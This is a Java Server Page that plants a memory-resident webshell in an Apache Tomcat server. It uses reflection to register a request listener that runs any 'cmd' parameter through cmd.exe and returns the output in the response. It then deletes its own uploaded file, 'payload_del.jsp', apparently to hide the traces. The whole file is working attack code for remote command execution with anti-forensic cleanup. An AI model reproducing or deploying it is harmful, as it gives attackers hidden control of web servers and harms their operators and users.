<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.IOException" %>
<%@ page import = " java.io.* " %>

<%!
    public class MyListenerWebshell implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().getWriter().write(out);
                }
                catch (IOException e) {}
                catch (NoSuchFieldException e) {}
                catch (IllegalAccessException e) {}
            }
        }

        public void requestInitialized(ServletRequestEvent sre) {}
    }
%>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    MyListenerWebshell listenerDemo = new MyListenerWebshell();
    context.addApplicationEventListener(listenerDemo);
%>

<%
    String path =  application.getRealPath( "/" );  // 获得当前的绝对路径
    String url =  path + "/uploads/" + "payload_del.jsp" ;  // 获得绝对文件名称
    out.println("path:" + path);
    out.println(url);
    out.println( " <br><hr> " );
    File f = new  File(url);
    boolean  flag = false ;
    if  (f.exists()) { //如果文件存在删除 如果文件不存在 打印出文件找不到
        flag=f.delete();
        if (flag)
        {
            out.println ("success");
        }
        else
        {
            out.println("file can not delete");
        }
    }
    else
        out.println( " file not exists  " );

%>


